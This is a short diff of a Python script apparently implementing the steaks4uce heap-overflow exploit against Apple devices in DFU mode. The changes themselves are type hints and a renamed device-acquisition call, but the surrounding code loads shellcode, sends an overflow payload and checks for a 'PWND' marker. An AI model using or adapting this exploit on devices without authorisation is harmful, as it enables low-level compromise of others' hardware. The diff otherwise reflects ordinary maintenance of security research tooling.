@@ -111,7 +111,7 @@ payload = b"\x00" * 256 + struct.pack(
 )
 
 
-def generate_shellcode(constants):
+def generate_shellcode(constants: list[int]) -> bytes:
     with open("bin/steaks4uce-shellcode.bin", "rb") as f:
         shellcode = f.read()
 
@@ -128,10 +128,10 @@ def generate_shellcode(constants):
     )
 
 
-def exploit():
+def exploit() -> None:
     print("*** based on steaks4uce exploit (heap overflow) by pod2g ***")
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     print("Found:", device.serial_number)
 
     if "PWND:[" in device.serial_number:
@@ -165,11 +165,11 @@ def exploit():
 
     time.sleep(0.01)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     failed = "PWND:[steaks4uce]" not in device.serial_number
     dfu.release_device(device)
 
